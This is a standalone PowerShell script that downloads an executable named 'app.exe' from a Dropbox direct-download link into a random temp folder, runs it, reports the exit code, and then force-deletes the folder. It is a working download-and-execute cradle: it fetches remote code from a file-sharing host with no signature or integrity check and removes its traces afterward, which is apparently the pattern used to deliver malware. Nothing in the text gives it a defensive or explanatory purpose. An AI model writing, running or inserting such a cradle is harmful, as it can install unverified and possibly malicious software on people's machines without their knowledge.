$url = "https://www.dropbox.com/scl/fi/bmhzfsr1jozvewn6nf58f/app.exe?rlkey=nczxbpok66yan9ikshrupo0pm&st=2niocezv&dl=1"  # Corrected Dropbox URL for direct download
$tempdir = "$env:TEMP\$(New-Guid)"  # Create a unique temporary directory
mkdir $tempdir | Out-Null
$file = "$tempdir\app.exe"  # Define the temporary file path

try {
    irm -Uri $url -OutFile $file -ErrorAction Stop  # Download the file to the temporary directory
    $proc = Start-Process $file -PassThru -Wait  # Execute the downloaded file
    Write-Host "Process exited with code: $($proc.ExitCode)"  # Output the process exit code
} catch {
    Write-Error "An error occurred: $_"  # Catch and output any errors that occur
} finally {
    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  # Clean up the temporary directory
}
